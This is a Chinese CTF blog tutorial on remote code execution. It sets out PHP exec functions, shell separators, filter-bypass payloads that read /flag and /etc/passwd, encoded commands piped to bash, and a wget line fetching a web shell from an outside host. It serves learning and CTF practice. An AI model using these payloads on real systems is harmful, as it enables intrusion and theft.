@@ -1,0 +1,352 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>RCE | Blog of AyaN0</title><meta name="author" content="AyaN0"><meta name="copyright" content="AyaN0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="RCE（远程代码执行漏洞）原理及漏洞相关RCE，Romote Code Execution漏洞，即通过向后台服务器远程注入系统命令或代码来控制后台系统 原理 一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RCE">
+<meta property="og:url" content="https://ayan0.top/2025/01/21/RCE/index.html">
+<meta property="og:site_name" content="Blog of AyaN0">
+<meta property="og:description" content="RCE（远程代码执行漏洞）原理及漏洞相关RCE，Romote Code Execution漏洞，即通过向后台服务器远程注入系统命令或代码来控制后台系统 原理 一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ayan0.top/img/shiratama.webp">
+<meta property="article:published_time" content="2025-01-21T13:29:33.000Z">
+<meta property="article:modified_time" content="2025-01-21T13:30:51.259Z">
+<meta property="article:author" content="AyaN0">
+<meta property="article:tag" content="-Web -CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ayan0.top/img/shiratama.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "RCE",
+  "url": "https://ayan0.top/2025/01/21/RCE/",
+  "image": "https://ayan0.top/img/shiratama.webp",
+  "datePublished": "2025-01-21T13:29:33.000Z",
+  "dateModified": "2025-01-21T13:30:51.259Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "AyaN0",
+      "url": "https://ayan0.top/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/logo.png"><link rel="canonical" href="https://ayan0.top/2025/01/21/RCE/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'RCE',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/shiratama2.webp);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/shiratama.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/shiratama.jpg" alt="Logo"><span class="site-name">Blog of AyaN0</span></a><a class="nav-page-title" href="/"><span class="site-name">RCE</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">RCE</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-01-21T13:29:33.000Z" title="发表于 2025-01-21 21:29:33">2025-01-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-01-21T13:30:51.259Z" title="更新于 2025-01-21 21:30:51">2025-01-21</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="RCE（远程代码执行漏洞）原理及漏洞相关"><a href="#RCE（远程代码执行漏洞）原理及漏洞相关" class="headerlink" title="RCE（远程代码执行漏洞）原理及漏洞相关"></a>RCE（远程代码执行漏洞）原理及漏洞相关</h1><p>RCE，Romote Code Execution漏洞，即通过向后台服务器远程注入系统命令或代码来控制后台系统</p>
+<p><strong>原理</strong></p>
+<p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器。 现在很多的企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行的漏洞。 远程代码执行 同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。 因此，如果需要给前端用户提供操作类的API接口，一定需要对接口输入的内容进行严格的判断，比如实施严格的白名单策略会是一个比较好的方法。</p>
+<p><strong>系统命令执行函数</strong></p>
+<pre><code class="highlight plaintext">*** system() 语法为system(string $command, int &amp;$return var = ?)
+*** passthru() system()的平替，写个命令就会执行命令，自己能回显
+*** exec() 示例exec(&quot;cat /flag&quot;)，其本身没有回显
+*** shell_exec() 格式分别为shell_exec（ls）和`ls`,不能自己回显，需要借用echo\print等输出结果
+*** popen() 语法为popen(string $command, string $mode),command参数: 要执行的命令,mode参数: 模式&#x27;r&#x27;表示阅读，&#x27;w&#x27; 表示写入。不能自己回显，需要print_r等输出内容
+*** proc_open() 语法为proc_open($command,$descriptor spec,$pipes,$cwd,$env vars,$options)
+$command是要执行的命令。
+$descriptorspec是一个描述符规范数组，用于指定进程的输入、输出和错误的文件描述符。
+$pipes是一个引用变量，用于存储与进程相关的管道。
+$cwd（可选）是设置子进程的当前工作目录。
+$env（可选）是设置子进程的环境变量。
+$other_options（可选）是其他选项，如设置超时等
+不能直接回显
+*** pcntl_exec()  语法格式为pcntl exec(string $path, array $args = ?, array $envs = ?)
+path必须时可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本 (比如文件第一行是#!/usr/local/bin/perl的perl脚本)。args是一个要传递给程序的参数的字符串数组。
+envs是一个要传递给程序作为环境变量的字符串数组。这个数组是 key =&gt; value格式的，key代表要传递的环境变量的名称，value代表该环境变量值。该函数没有回显，解决方法一：cat文件并输出到有权限读取路径；解决方法二：shell反弹</code></pre>
+
+<p>那么如果遇到类似PING的执行漏洞，如何将前面的字段和系统命令无缝衔接呢？</p>
+<p>那么就需要管道符来支持：</p>
+<p>*<strong>关于管道符</strong></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/803305e48f88c6e5804f38315b798f21.png" alt="img"></p>
+<p><strong>For Windows：</strong></p>
+<p>“|” : 直接执行后面的语句。例如：<code>ping 127.0.0.1| whoami</code><br>“||” : 如果前面执行的语句执行出错，则执行后面的语句，否则只执行前面的语句。例如： <code>ping 1234.1 || whoami</code><br>“&amp;” : 如果前面的语句为假则直接执行后面的语句，前面的语句可真可假 。例如： <code>ping 127.0.0.1 &amp; whoami</code><br>“&amp;&amp;” : 如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真。例如： <code>ping 127.0.0.1 &amp;&amp; whoami</code></p>
+<p><strong>For Linux:</strong></p>
+<p>“;” : 执行完前面的语句再执行后面的。 例如： <code>ping 127.0.0.1 ; whoami</code><br>“|” : 显示后面语句的执行结果。列如：<code>ping 127.0.0.1 | whoami</code><br>“||” : 当前的语句执行出错时，执行后面的语句。 例如： <code>ping 1472.1 || whoami</code><br>“&amp;” : 如果前面得语句为假则直接执行后面的语句，前面的语句可真可假，例如：<code>ping 127.0.0.1 | &amp; whoami</code><br>“&amp;&amp;” : 如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真。例如： <code>ping 127.0.0.1 &amp;&amp; whoami</code></p>
+<p>发现漏洞后，如何得到控制权呢？</p>
+<p>最简单的漏洞就是找到注入点直接注</p>
+<p>但是难免会碰到存在黑名单的情况，这个时候就需要绕过出场了</p>
+<h2 id="空格过滤绕过："><a href="#空格过滤绕过：" class="headerlink" title="空格过滤绕过："></a>空格过滤绕过：</h2><h3 id="大括号-："><a href="#大括号-：" class="headerlink" title="大括号{}："></a>大括号{}：</h3><pre><code class="highlight plaintext">&#123;cat,flag.php&#125;</code></pre>
+
+<h3 id="IFS代替空格："><a href="#IFS代替空格：" class="headerlink" title="$IFS代替空格："></a><code>$IFS</code>代替空格：</h3><p><code>$IFS$9</code>，<code>$&#123;IFS&#125;</code>，<code>$IFS</code>这三个都行</p>
+<p>Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符 (internal field separator)。</p>
+<pre><code class="highlight plaintext">?cmd=ls$IFS-I</code></pre>
+
+<p>单纯$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名</p>
+<pre><code class="highlight plaintext">?cmd=ls$&#123;IFS&#125;-l</code></pre>
+
+<p>$IFS$9后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者始终为空字符串。</p>
+<pre><code class="highlight plaintext">?cmd=ls$&#123;IFS&#125;$9-l</code></pre>
+
+<h3 id="重定向字符"><a href="#重定向字符" class="headerlink" title="重定向字符&lt;，&lt;&gt;"></a>重定向字符&lt;，&lt;&gt;</h3><p>(具体哪种情景能用还不太清楚)</p>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>%20绕过(相当于url编码的空格)</p>
+<p>%09绕过（相当于Tab键）</p>
+<p>%0a–代表换行符</p>
+<p>%0b–用于在输出或显示文本时在该位置产生一个固定的垂直间距，类似于tab键。</p>
+<p>%0d–回车换行</p>
+<p>%a0–代表的是非断行空格</p>
+<p>%00–%00代表的是ASCII码中的空字符</p>
+<p>可以将空格字符替换成注释&#x2F;**&#x2F;，也可以使用内联注释<code>/!code/</code>        </p>
+<p>内联注释绕过知识点</p>
+<pre><code>    当一些关键语句被过滤时，内联注释就是把一些特有的仅在 mysql 上的语句放在 /*!  */中，这样这些语句如果在其它数据库中是不会被执行，但在 mysql 中会执行
+</code></pre>
+<h2 id="文件名过滤绕过："><a href="#文件名过滤绕过：" class="headerlink" title="文件名过滤绕过："></a>文件名过滤绕过：</h2><h3 id="绕过"><a href="#绕过" class="headerlink" title="??,*绕过"></a>??,*绕过</h3><p><code>passthru</code>代替<code>system</code>，过滤flag文件名用?，*绕过</p>
+<pre><code class="highlight plaintext">cat /fl??
+
+cat /f*  #多个匹配结果同时展现</code></pre>
+
+<p>以上指令等效于<code>cat /flag</code></p>
+<h3 id="单引号-‘-双引号-“”-反引号-绕过正则"><a href="#单引号-‘-双引号-“”-反引号-绕过正则" class="headerlink" title="单引号(‘)双引号(“”)反引号(&#96;&#96;)绕过正则"></a>单引号(‘)双引号(“”)反引号(&#96;&#96;)绕过正则</h3><pre><code class="highlight plaintext">cat /fl&quot;&quot;ag
+
+c&quot;&quot;at /e&#x27;t&#x27;c/pas``s``wd</code></pre>
+
+<p>对<code>php</code>来说这是<code>fl&quot;&quot;ag</code>而不是<code>flag</code>关键字不会匹配上，但是对于linux系统来说<code>cat /fl&quot;&quot;ag</code>等效于<code>cat /flag</code>。外面包裹的是单引号里面就是双引号，外面包裹的是双引号里面就是单引号，或者用斜线\去掉功能性，避免报错</p>
+<pre><code class="highlight plaintext">passthru(&#x27;cat /fl&quot;&quot;ag.p\&#x27;\&#x27;hp&#x27;)</code></pre>
+
+<h3 id="反斜杠-绕过"><a href="#反斜杠-绕过" class="headerlink" title="反斜杠\绕过"></a>反斜杠\绕过</h3><p>\特殊字符去掉功能性，单纯表示为字符串，而linux看到反斜线\会自动帮你去掉,正常执行命令</p>
+<pre><code class="highlight plaintext">cat fl\ag.p\hp</code></pre>
+
+<h3 id="特殊变量：-1到-9、-和"><a href="#特殊变量：-1到-9、-和" class="headerlink" title="特殊变量：$1到$9、$@和$*"></a>特殊变量：$1到$9、$@和$*</h3><p>这些特殊变量输出为空</p>
+<pre><code class="highlight plaintext">cat /fl$9ag
+
+cat /fl$@ag</code></pre>
+
+<p>或者在单词结尾处插入$x，这里的x可以是任意字母，例如可以写成如下形式：</p>
+<pre><code class="highlight plaintext">c$@at /e$@tc/pas$@swd
+
+cat$x /etc$x/passwd$x
+
+ca$@t /etc$x/passwd$x</code></pre>
+
+<h3 id="内联执行绕过（通过赋值绕过）"><a href="#内联执行绕过（通过赋值绕过）" class="headerlink" title="内联执行绕过（通过赋值绕过）"></a>内联执行绕过（通过赋值绕过）</h3><p>a&#x3D;c;b&#x3D;a;c&#x3D;t;$a$b$c &#x2F;1.txt</p>
+<p>a&#x3D;f;c&#x3D;a;d&#x3D;g;b&#x3D;l;cat $a$b$c$d.php（abcd拼接出来flag）</p>
+<h3 id="利用linux中的环境变量"><a href="#利用linux中的环境变量" class="headerlink" title="利用linux中的环境变量"></a>利用linux中的环境变量</h3><p>使用环境变量里的字符执行变量</p>
+<p>echo $PATH              #PATH默认系统环境变量</p>
+<p>如果出现：</p>
+<pre><code class="highlight bash">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</code></pre>
+
+<p>则以下代码表示了flag.php</p>
+<pre><code class="highlight plaintext">echo f$&#123;PATH:5:1&#125;$&#123;PATH:8:1&#125;$&#123;PATH:66:1&#125;.$&#123;PATH:93:1&#125;h$&#123;PATH:93:1&#125;</code></pre>
+
+<p>比如${PATH:5:1}指的是取路径的第五位（从0开始数，第0位是&#x2F;）的字符，步长为1，即只取一个字母l，以此类推就能拼接成关键字<code>flag.php</code></p>
+<h2 id="常见文件读取命令绕过："><a href="#常见文件读取命令绕过：" class="headerlink" title="常见文件读取命令绕过："></a>常见文件读取命令绕过：</h2><h3 id="base64编码："><a href="#base64编码：" class="headerlink" title="base64编码："></a>base64编码：</h3><pre><code class="highlight plaintext">cat flag.php--&gt; Y2FOIGZSYWcucGhw
+echo Y2FOIGZsYWcucGhw | base64 -d</code></pre>
+
+<p>管道符|把前面指令执行的结果，变成后面指令的参数，所以这里会解码读取命令</p>
+<p>执行命令的话有三种形式：</p>
+<pre><code class="highlight plaintext">echo Y2FOIGZsYWcucGhw | base64 -d | bash
+
+$(echo Y2FOIGZsYWcucGhw | base64 -d)
+
+`echo Y2FOIGZsYWcucGhw | base64 -d`   #反引号</code></pre>
+
+<p> 把<code>cat flag.php</code>，放在bash里执行，同理想换成什么命令就base64编码后替换</p>
+<h3 id="base32编码同理"><a href="#base32编码同理" class="headerlink" title="base32编码同理"></a>base32编码同理</h3><pre><code class="highlight plaintext">?cmd=system(&#x27;echo &quot;MNQXIIDGNRQWOLTQNBYA====&quot;|base32 -d|/bin/bash&#x27;);</code></pre>
+
+<h3 id="HEX编码（ASCII编码）"><a href="#HEX编码（ASCII编码）" class="headerlink" title="HEX编码（ASCII编码）"></a>HEX编码（ASCII编码）</h3><h4 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h4><pre><code class="highlight plaintext">import binascii
+s = b&quot;tac flag&quot;
+h = binascii.b2a_hex(s)
+print(h)</code></pre>
+
+<p>tac flag–&gt; 74616320666c6167</p>
+<pre><code class="highlight plaintext">echo &quot;74616320666c6167”|xxd -r -p|bash</code></pre>
+
+<h4 id="xxd-二进制显示和处理文件工具。"><a href="#xxd-二进制显示和处理文件工具。" class="headerlink" title="xxd: 二进制显示和处理文件工具。"></a>xxd: 二进制显示和处理文件工具。</h4><p>-r-p将纯十六进制转储的反向输出打印为了ASCII格式<br>bash、sh、&#x2F;bin&#x2F;bash、反引号等</p>
+<pre><code class="highlight plaintext">?cmd=passthru(&#x27;echo &quot;74616320666c6167”|xxd -r -p|bash&#x27;);</code></pre>
+
+<h4 id="shellcode编码（16进制的机器码）"><a href="#shellcode编码（16进制的机器码）" class="headerlink" title="shellcode编码（16进制的机器码）"></a>shellcode编码（16进制的机器码）</h4><pre><code class="highlight plaintext">?cmd=passthru(&#x27;printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;|bash&#x27;);
+
+?cmd=passthru(&#x27;`printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;`&#x27;);
+
+?cmd=passthru(&#x27;$(printf&quot;\x74\x61\x63\x20\x66\x6c\x61\x67\x2e\x70\x68\x70&quot;)&#x27;);</code></pre>
+
+<h2 id="读取命令被绕过："><a href="#读取命令被绕过：" class="headerlink" title="读取命令被绕过："></a>读取命令被绕过：</h2><p>比如说过滤了cat，在这之前先分清:</p>
+<p><code>cat flag.php</code> 是用于在终端上显示当前目录下名为 <code>flag.php</code> 的文件的内容。</p>
+<p><code>cat /flag</code> 是用于在终端上显示根目录下名为 flag 的文件的内容。</p>
+<p><code>cat flag</code> 是用于在终端上显示当前目录下名为 flag 的文件的内容。</p>
+<p>正常来说flag放在根目录下，不过也可能是在当前网页目录下</p>
+<p>别的指令也同理</p>
+<ul>
+<li><p>tac:反向显示，从最后一行开始往前显示</p>
+<pre><code class="highlight plaintext">tac /flag</code></pre>
+
+
+</li>
+<li><p>more:一页一页显示档案内容</p>
+<pre><code class="highlight plaintext">more flag.php</code></pre>
+
+
+</li>
+<li><p>less：与more类似</p>
+</li>
+<li><p>tail：查看末尾几行</p>
+</li>
+<li><p>nl：显示的时候，顺便输出行号</p>
+<pre><code class="highlight plaintext">nl /flag</code></pre></li>
+</ul>
+<p><code>nl /flag</code> 和 <code>nl flag</code> 是不同的。</p>
+<p>在 Linux 系统中，<code>nl</code>命令用于给文件添加行号。当使用 <code>nl /flag</code> 命令时，<code>/flag</code> 被视为一个文件路径，并将该文件的内容输出到标准输出（通常是终端），并在每一行前添加行号。如果 &#x2F;flag 文件存在且有读取权限，那么 <code>nl /flag</code> 将会给该文件的内容添加行号。</p>
+<p>而当使用 <code>nl flag</code> 命令时，flag 被视为一个相对于当前目录的文件路径。也就是说，<code>nl flag</code> 命令将会尝试在当前目录下找到名为 flag 的文件，并给其内容添加行号。（不过flag一般在根目录）</p>
+<ul>
+<li>od：以二进制方式读取档案内容。正常的<code>od /flag</code>输出的纯纯二进制<br>想看到文件内容需要：</li>
+</ul>
+<pre><code class="highlight plaintext">passthru(&quot;od -A d -c /fla\g&quot;);</code></pre>
+
+<ul>
+<li><p>xxd：读取二进制文件</p>
+<pre><code class="highlight plaintext">xxd /flag</code></pre>
+
+
+</li>
+<li><p>sort：主要用于排序文件 </p>
+<pre><code class="highlight plaintext">so?t /flag
+/usr/bin/s?rt /flag</code></pre></li>
+</ul>
+<p><code>/usr/bin/sort</code> 和 <code>sort</code> 实际上是同一个命令。<code>/usr/bin</code> 目录是系统的标准目录之一，它包含了许多系统命令和工具的二进制文件，而 sort 命令通常就存放在 <code>/usr/bin</code> 目录中,因此<code>/usr/bin/sort /flag</code> 和 <code>sort /flag</code> 是等价的。有时候sort不行可能<code>/usr/bin/s?r</code>t可以</p>
+<ul>
+<li>uniq：报告或删除文件中重复的行，其实当成cat用就行</li>
+<li>file -f:报错出具体内容<br>passthru(“file -f &#x2F;flag”);</li>
+<li>grep：在文本中查找指定字符串<br>passthru(“grep fla &#x2F;fla*”);</li>
+</ul>
+<p>grep fla &#x2F;fla* 命令会匹配根目录下所有以 fla 开头的文件（不包括子目录），然后将这些文件中包含字符串 fla 的行输出到终端上。因此，这个命令会搜索根目录下以 fla 开头的所有文件，并匹配其中包含 fla 字符串的行。</p>
+<p>而 grep fla fla* 命令中 fla* 是当前目录下以 fla 开头的所有文件的通配符，它会匹配当前目录下所有以 fla 开头的文件，然后将这些文件中包含字符串 fla 的行输出到终端上。因此，这个命令只会搜索当前目录下以 fla 开头的文件，并匹配其中包含 fla 字符串的行。</p>
+<ul>
+<li>strings：<br>相当于cat</li>
+</ul>
+<h2 id="无回显时间盲注："><a href="#无回显时间盲注：" class="headerlink" title="无回显时间盲注："></a>无回显时间盲注：</h2><p>逻辑和SQL注入的时间盲注差不多</p>
+<p>相关命令：<br>1.sleep<br>sleep 5       #5秒之后返回结果</p>
+<p>2.awk：逐行获取数据<br>3.cut -c<br>cut命令逐列获取单个字符<br>cat flag | awk NR&#x3D;&#x3D;2  | cut -c 1      #获取第一个字符<br>cat flag | awk NR&#x3D;&#x3D;2  | cut -c 2      #获取第二个字符</p>
+<p>3.利用cp命令：cp flag.php 1.txt</p>
+<p>4.利用mv命令：mv flag.php 1.txt</p>
+<p>5.利用&gt;输出结果到文件：ls &gt; 1.txt</p>
+<p>6.tee:Linux tee命令用于读取标准输入的数据，并将其内容输出成文件</p>
+<p>7.利用wget下载：</p>
+<pre><code class="highlight plaintext">wget http://ip/shell.txt &gt; shell.php或者wget http://ip/shell.txt -O shell.php</code></pre>
+
+<p>8.dnslog外带数据</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://ayan0.top">AyaN0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://ayan0.top/2025/01/21/RCE/">https://ayan0.top/2025/01/21/RCE/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://ayan0.top" target="_blank">Blog of AyaN0</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web-CTF/">-Web -CTF</a></div><div class="post-share"><div class="social-share" data-image="/img/shiratama.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/shiratama.webp" 